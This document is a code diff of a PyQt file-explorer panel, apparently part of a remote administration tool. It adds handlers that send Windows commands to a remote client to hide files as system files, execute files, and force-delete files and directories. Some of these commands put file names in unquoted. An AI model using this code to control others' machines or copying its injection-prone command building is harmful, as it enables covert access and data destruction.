@@ -43,7 +43,9 @@ class mainPopup(QWidget, Ui_Form):
         self.upButton.clicked.connect(self.parent_folder)
         self.explorerTable.doubleClicked.connect(self.open_folder)
         self.explorerPathEntry.returnPressed.connect(self.open_path)
-        #self.uploadButton.clicked.connect(self.upload)
+        # TODO: TEMP
+        self.addFileButton.clicked.connect(self.execute_remotely)
+        self.removeButton.clicked.connect(self.remove)
         #self.downloadButton.clicked.connect(self.download)
         #self.cancelButton.clicked.connect(self.cancelProgress)
         #self.refreshButton.clicked.connect(self.refresh)
@@ -134,41 +136,43 @@ class mainPopup(QWidget, Ui_Form):
     #
     #     except AttributeError:
     #         pass
-    #
-    # def unhide(self):
-    #     _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
-    #     get(self.sock, 'attrib -h -s {}'.format(_file), 'hide')
-    #     self.get_content()
-    #
-    # def hide(self):
-    #     _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
-    #     get(self.sock, 'attrib +h +s {}'.format(_file), 'unhide')
-    #     self.get_content()
-    #
-    # def execute_remotely(self):
-    #     _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
-    #     data = get(self.sock, 'start /d %CD% {}'.format(_file), 'execute')
-    #
-    # def remove(self):
-    #     try:
-    #         _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
-    #         _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
-    #
-    #         warn = QMessageBox(QMessageBox.Question, _('MEXPLORER_MSG_CONFIRM'), _('MEXPLORER_MSG_DELETE'))
-    #         warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
-    #         ans = warn.exec_()
-    #         if ans == QMessageBox.Yes:
-    #             if '<FILE>' in _type:
-    #                 result = get(self.sock, 'del /Q %s' % _file, 'remove')
-    #             elif '<DIR>' in _type:
-    #                 result = get(self.sock, 'rmdir /S /Q %s' % _file, 'remove')
-    #             self.get_content()
-    #         else:
-    #             return
-    #     except AttributeError:
-    #         warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_NO_FILE'), QMessageBox.Ok)
-    #         warn.exec_()
 
+    def unhide(self):
+        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
+        self.moderator.send_msg('attrib -h -s {}'.format(_file), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+        self.callback = self.recv_content
+
+    def hide(self):
+        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
+        self.moderator.send_msg('attrib +h +s {}'.format(_file), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+        self.callback = self.recv_content
+
+    # Execute File Remotely
+    def execute_remotely(self):
+        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
+        self.moderator.send_msg('start /d %CD% {}'.format(_file), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+        self.callback = self.recv_content
+
+
+    def remove(self):
+        try:
+            _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
+            _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
+
+            warn = QMessageBox(QMessageBox.Question, _('MEXPLORER_MSG_CONFIRM'), _('MEXPLORER_MSG_DELETE'))
+            warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
+            ans = warn.exec_()
+            if ans == QMessageBox.Yes:
+                if '<FILE>' in _type:
+                    self.moderator.send_msg('del /Q "%s"' % _file, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+                elif '<DIR>' in _type:
+                    self.moderator.send_msg('rmdir /S /Q "%s"' % _file, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+                self.callback = self.recv_content
+            else:
+                return
+        except AttributeError:
+            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_NO_FILE'), QMessageBox.Ok)
+            warn.exec_()
 
     # open remote folder
     def open_folder(self):
@@ -294,6 +298,3 @@ class mainPopup(QWidget, Ui_Form):
 
         # set folders & files count
         self.dirfilesCountLabel.setText('{0}/{1}'.format(folder_count, file_count))
-
-
-
